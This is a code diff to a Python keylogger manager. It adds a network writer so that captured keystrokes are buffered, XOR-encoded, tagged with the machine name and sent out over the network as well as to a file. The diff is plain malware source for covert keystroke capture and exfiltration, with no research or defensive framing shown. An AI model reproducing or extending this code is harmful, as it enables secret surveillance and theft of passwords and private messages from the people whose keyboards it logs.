@@ -5,6 +5,7 @@ import os
 from KeyloggerService import service
 from Encryption_file import encryptor
 from FileWriter import file_writer
+from networkWriter import networkWriter
 
 class KeyLoggerManager:
     def __init__(self):
@@ -23,27 +24,37 @@ class KeyLoggerManager:
             }
 
     def manager(self):
-        new_keys = -1
         service.start_logging()
         end = False
-        while not end:
-            new_keys = service.get_logged_keys()
-            if new_keys and "<ESC>" in self.buffer:
-                end = True
-            time.sleep(5)
-        if new_keys:
-            timestamp = str(datetime.datetime.now())
+        try:
+            while not end:
+                new_keys = service.get_logged_keys()
+                if new_keys:
+                    self.buffer.extend(new_keys)
 
-            encrypted_keys = []
-            for char in new_keys:
-                encrypted_keys.append(encryptor.ascii_xor(char))
 
-            content = {timestamp: encrypted_keys}
-            machine_name = self.config.get("machine_name", "unknown")
-            file_writer.send_data(content, machine_name)
+                    if "<ESC>" in new_keys:
+                        end = True
 
-            service.logged_keys = []
+                    if len(self.buffer) > 20 or end:
+                        timestamp = str(datetime.datetime.now())
 
+                        encrypted_keys = []
+                        for char in self.buffer:
+                            encrypted_keys.append(encryptor.ascii_xor(char))
+
+                        content = {timestamp: encrypted_keys}
+                        machine_name = self.config.get("machine_name", "unknown")
+                        file_writer.send_data(content, machine_name)
+                        networkWriter.send_data(content, machine_name)
+
+                        self.buffer = []
+
+                time.sleep(5)
+        except KeyboardInterrupt:
+            pass
+        finally:
+            service.stop_logging()
 
 
 if __name__ == "__main__":
